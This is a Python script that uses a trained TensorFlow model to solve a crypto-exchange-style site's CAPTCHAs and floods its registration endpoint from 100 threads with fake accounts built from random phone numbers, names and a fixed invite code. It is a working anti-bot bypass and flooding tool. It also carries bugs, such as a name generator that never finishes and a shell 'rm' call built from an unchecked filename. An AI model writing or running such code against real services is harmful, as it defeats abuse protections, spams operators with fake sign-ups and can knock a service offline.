import requests
import base64

import random
import time
import string
import threading

import os
import tensorflow as tf
import numpy as np
from tensorflow import keras
from tensorflow.keras import layers

captcha_dir = "./captcha_tmp"
loaded_model = tf.keras.models.load_model('./vnbitcoin_captcha', compile=False)
batch_size = 16

# Desired image dimensions
img_width = 64
img_height = 20
all_chars =  ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

# base_url = 'https://api.vnbitcoin.cc'
base_url = 'https://api.gateio.com.mx'
reg_url = base_url + "/v1/User/reg"
cap_url = base_url + "/v1/User/cap"


def register(data):
	# resp = rt.post(reg_url, data=data).text
	resp = requests.post(reg_url, data=data).json()
	print(resp["message"])

def get_captcha():
	# resp = rt.get(cap_url).json()
	resp = requests.get(cap_url).json()
	data = resp["data"]

	cap_id = data["id"]
	base64_img = data['base_64_blob'].split(',')[1]

	# filename = captcha_dir + "/" + cap_id + ".png"

	# imgdata = base64.b64decode(base64_img)

	# im = Image.open(BytesIO(base64.b64decode(base64_img)))

	# with open(filename, 'wb') as f:
	# 	f.write(imgdata)
	base64_img = base64_img.replace("+", "-")
	base64_img = base64_img.replace("/", "_")

	return (cap_id, base64_img)


# Mapping characters to integers
char_to_num = layers.StringLookup(
    vocabulary=list(all_chars), mask_token=None
)

# Mapping integers back to original characters
num_to_char = layers.StringLookup(
    vocabulary=char_to_num.get_vocabulary(include_special_tokens=False), 
    mask_token=None, 
    invert=True
)


def encode_faster(base64_img, label):
    img = tf.io.decode_base64(base64_img) 
    img = tf.io.decode_jpeg(img, channels=1)
    img = tf.image.convert_image_dtype(img, tf.float32)
    img = tf.image.resize(img, [img_height, img_width])
    img = tf.transpose(img, perm=[1, 0, 2])
    label = char_to_num(tf.strings.unicode_split(label, input_encoding="UTF-8"))

    return {"image": img, "label": label}


def encode_single_sample(img_path, label):
    # 1. Read image
    img = tf.io.read_file(img_path)
    # 2. Decode and convert to grayscale
    img = tf.io.decode_jpeg(img, channels=1)
    # 3. Convert to float32 in [0, 1] range
    img = tf.image.convert_image_dtype(img, tf.float32)
    # 4. Resize to the desired size
    img = tf.image.resize(img, [img_height, img_width])
    # 5. Transpose the image because we want the time
    # dimension to correspond to the width of the image.
    img = tf.transpose(img, perm=[1, 0, 2])
    # 6. Map the characters in label to numbers
    label = char_to_num(tf.strings.unicode_split(label, input_encoding="UTF-8"))
    # 7. Return a dict as our model is expecting two inputs
    return {"image": img, "label": label}


# A utility function to decode the output of the network
def decode_batch_predictions(pred):
    input_len = np.ones(pred.shape[0]) * pred.shape[1]
    # Use greedy search. For complex tasks, you can use beam search
    results = keras.backend.ctc_decode(pred, input_length=input_len, greedy=True)[0][0][
        :, :4
    ]
    # Iterate over the results and get back the text
    output_text = []
    for res in results:
        res = tf.strings.reduce_join(num_to_char(res)).numpy().decode("utf-8")
        output_text.append(res)
    return output_text




def solve_captcha(cap_id, image):
	real_data = tf.data.Dataset.from_tensor_slices(([image], ['1111']))
	real_data = (
	    real_data.map(
	        encode_faster, num_parallel_calls=tf.data.AUTOTUNE
	    )
	    .batch(batch_size)
	    .prefetch(buffer_size=tf.data.AUTOTUNE)
	)

	for batch in real_data.take(1):
	    batch_images = batch["image"]
	    batch_labels = batch["label"]

	    preds = loaded_model.predict(batch_images)
	    pred_texts = decode_batch_predictions(preds)

	    orig_texts = ["test"]
	    for label in batch_labels:
	        label = tf.strings.reduce_join(num_to_char(label)).numpy().decode("utf-8")
	        orig_texts.append(label)
    
	return pred_texts[0]


def random_phone():
	ran = str(random.randrange(300000000, 900000000))
	return '84' + ran.rjust(10, '0')


def random_name():
	return ''.join(random.choice(string.ascii_uppercase) for _ in range(10000000000))


def clean_up(filename):
	clean_png_cmd = "rm " + filename
	os.system(clean_png_cmd)

#name = random_name()
#phone =random_phone()

def flood():
	while True:
		cap_id, image = get_captcha()
		cap_sol = solve_captcha(cap_id, image)
		name = random_name
		reg_data = {
			'vid': cap_id,
			'phone': random_phone(),
			'name': name,
			'wpassword': name,
			'password': name,
			# 'invitecode': 'VmrPlg',
			'invitecode': 'mrwoRp',
			'vercode': cap_sol
		}

		register(reg_data)
		# clean_up(filename)


# clean start
# clean_all_png_cmd = "rm " + captcha_dir + "/*.png"
# os.system(clean_all_png_cmd)

# flood()


# cap_id, image = get_captcha()

# print(image)
# encode_faster(image, '1111')

threads = []

for i in range(100):
	t = threading.Thread(target=flood)
	t.daemon = True
	threads.append(t)


for i in range(100):
	threads[i].start()

for i in range(100):
	threads[i].join()





